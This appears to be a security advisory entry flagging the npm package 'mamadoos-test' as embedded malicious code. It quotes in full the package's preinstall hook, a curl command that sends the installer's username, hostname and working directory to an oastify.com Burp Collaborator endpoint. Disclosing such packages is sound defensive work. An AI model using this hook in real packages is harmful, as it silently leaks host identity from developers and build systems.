summary: preinstall hook exfiltrates installer identity to Burp Collaborator endpoint
details: The package contains no functional code — only a malicious preinstall lifecycle hook. On `npm install`, package.json line 6 runs `curl https://b9lvuwltn3hrg0rlkevka4t75ybpzfn4.oastify.com/$(whoami)@$(hostname)?pwd=$(pwd)`, which exfiltrates the installer's username, hostname, and current working directory to a Burp Collaborator out-of-band collection subdomain. The package metadata is empty (no description, no main, no other files in the tarball), and the inflated version number (11.0.0) on a package named `mamadoos-test` is consistent with dependency-confusion attack staging or a pentest beacon. Any developer or CI system that installs this package will silently leak host identity to the attacker-controlled oastify.com endpoint.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
